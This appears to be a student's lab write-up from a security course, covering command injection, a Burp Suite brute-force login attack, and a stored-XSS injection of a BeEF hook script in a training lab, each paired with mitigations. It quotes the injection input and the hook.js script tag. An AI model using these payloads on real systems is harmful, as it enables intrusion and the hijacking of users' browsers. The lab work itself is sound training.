# Module 15: Testing Web Applications for Vulnerabilities

In this challenge, I played the role of an application security engineer at Replicants. Several new web applications have been developed, and my task was to test them for vulnerabilities. I also evaluated the Browser Exploitation Framework (BeEF) tool to understand its potential impact if the organization were targeted with it.

The goal was to test three web application vulnerabilities, identify any weaknesses, and provide mitigation strategies.

Below are the details of each vulnerability and how I documented them.

### Web Application 1: Command Injection - "Your Wish is My Command Injection"

**Setup Instructions:**
1. I accessed the web lab environment.
2. I navigated to the following URL: `http://192.168.13.25/vulnerabilities/exec/`.
3. I tested the webpage by entering the IP address `127.0.0.1` to confirm that the ping result displayed correctly.

**Exploit:**
- I manipulated the input by entering `127.0.0.1 && pwd` in the IP address field. This command caused the webpage to return both the ping results and the output of the `pwd` command, effectively verifying the command injection vulnerability.

<img width="702" alt="127 0 0 1   cat :etc:hosts" src="https://github.com/user-attachments/assets/ef816e8f-3634-479e-9551-49d388e951b4">

**Mitigation Strategies:**
1. **Input Validation and Sanitization:** I ensured that all user inputs are validated and sanitized to allow only valid and expected inputs. Special characters like `&&`, `;`, or `|` that can be used to chain commands should be prevented.
2. **Use Prepared Statements:** I used parameterized queries to avoid the direct inclusion of user input in system commands.
3. **Least Privilege Principle:** I ensured applications run with minimal privileges to limit potential damage from successful injection attacks.

### Web Application 2: Brute Force Vulnerability - "A Brute Force to Be Reckoned With"

**Setup Instructions:**
1. I opened the web lab environment and navigated to `http://192.168.13.35/ba_insecure_login_1.php`.
2. I used the provided lists of administrators and breached passwords to simulate a brute force attack using Burp Suite's Intruder feature.

**Exploit:**
- I successfully executed a brute force attack to discover a valid username and password combination.

<img width="706" alt="A Brute Force to Be Reckoned With_1" src="https://github.com/user-attachments/assets/da0844ae-f824-4c4e-8894-968f273d049f">
<img width="942" alt="A Brute Force to Be Reckoned With_2" src="https://github.com/user-attachments/assets/7d39660d-55d3-455d-a62d-61ca4044e523">

**Mitigation Strategies:**
1. **Account Lockout Mechanism:** I set up account lockout policies after a number of failed login attempts to prevent brute force attacks.
2. **Multi-Factor Authentication (MFA):** I required MFA to provide an additional layer of security.
3. **Password Complexity & Rate Limiting:** I enforced strong password policies and rate-limited login attempts to prevent rapid brute force attacks.

### Web Application 3: BeEF Exploitation - "Where's the BeEF?"

**Setup Instructions:**
1. I opened the command line in my web lab and navigated to the BeEF tool by accessing `http://127.0.0.1:3000/ui/panel`.
2. I logged in with the provided credentials.
3. I tested the simulated exploit using the BeEF Hook.

![User login](https://github.com/user-attachments/assets/eaa0c312-87b8-414f-90ac-9412bf06b0f8)
![Inspector - 50 - 100](https://github.com/user-attachments/assets/b0d1d04d-0627-4e95-9223-04653604ba50)


**Exploit:**
- I used the BeEF Hook script `<script src="http://127.0.0.1:3000/hook.js"></script>` and injected it into the vulnerable XSS page (`http://192.168.13.25/vulnerabilities/xss_s/`). I utilized a stored XSS attack to execute the payload.

![Social Engineering   Pretty Theft](https://github.com/user-attachments/assets/18aa7247-e541-4880-9464-2adc9bec81a3)
![Social Engineering   Fake Notification Bar](https://github.com/user-attachments/assets/219a4bec-a107-4248-8175-d27ce64e78bb)
![Host   Get Geolocation (Third Party)](https://github.com/user-attachments/assets/3d0960c8-ef50-4be3-a5e3-2866346d2ab9)


**Mitigation Strategies:**
Mitigation Strategies:

**Content Security Policy (CSP):** I implemented a CSP to restrict the sources from which scripts can be loaded. This policy helps mitigate cross-site scripting (XSS) attacks by allowing only trusted sources to load content, 
preventing malicious scripts from being executed. Additionally, I specified different directives such as ```script-src```, ```style-src```, and ```img-src``` to strictly define the origins that can serve content, 
thereby reducing the attack surface.

**Input Sanitisation:** I ensured that all user-generated inputs are sanitised and encoded to prevent XSS. This involved removing potentially dangerous characters and escaping output to prevent scripts from being injected. 
I used server-side validation to sanitise input data before processing it and also implemented HTML encoding to prevent the execution of user-supplied data that could potentially be interpreted as code.

**Regular Security Audits:** I conducted regular security audits to identify and fix XSS vulnerabilities. These audits included both automated vulnerability scanning and manual code reviews to ensure no XSS vulnerabilities are present. 
I also used tools like static code analysis to continuously monitor code changes, helping to identify potential issues early in the development cycle. Regular testing ensures that new updates or features do not introduce security flaws.



